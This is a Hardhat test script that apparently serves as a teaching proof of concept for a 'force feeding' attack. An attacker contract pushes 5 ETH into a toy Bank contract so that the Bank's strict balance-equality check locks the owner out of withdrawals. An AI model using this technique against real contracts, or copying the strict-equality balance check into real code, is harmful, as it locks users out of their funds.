import { expect } from "chai";
import { network } from "hardhat";

const { ethers } = await network.connect();


describe("ForceFeeding", async function () {
  it.only("Should do a Force Feeding", async function () {
    const [owner, attacker] = await ethers.getSigners();

    console.log("Owner:", owner.address);
    console.log("Attacker:", attacker.address);

    // Deploy Bank
    const Bank = await ethers.deployContract("Bank", { signer: owner });
    await Bank.waitForDeployment();
    const bankAddress = await Bank.getAddress();

    console.log("Bank deployed at:", bankAddress);

    // Owner sent 9 ETH to Bank
    for (let i = 0; i < 9; i++) {
      await Bank.connect(owner).deposit({ value: ethers.parseEther("1") });
    }

    console.log("Balance Bank after deposits",
      ethers.formatEther(await ethers.provider.getBalance(bankAddress)), "ETH");

    // Deploy ForceFeeder with 5 ETH 
    const ForceFeeder = await ethers.deployContract(
      "ForceFeeder",
      { signer: attacker, value: ethers.parseEther("5") }
    );
    await ForceFeeder.waitForDeployment();

    // Attack : Ask to send to Bank without its consent
    await ForceFeeder.connect(attacker).attack(bankAddress);

    const balanceAfterAttack = await ethers.provider.getBalance(bankAddress);
    console.log(" Bank Balance after force feeding:",
      ethers.formatEther(balanceAfterAttack), "ETH");

    // Owner try to withdraw all funds
    try {
      await Bank.connect(owner).withdrawAll();
      console.log("❌ Force Feeding failed, owner was able to withdraw");
    } catch (e) {
      console.log("✅ Withdraw impossible for owner, contract blocked. Because of this require in withdrawAll: require(address(this).balance == 10 ether);");
    }
  });
});
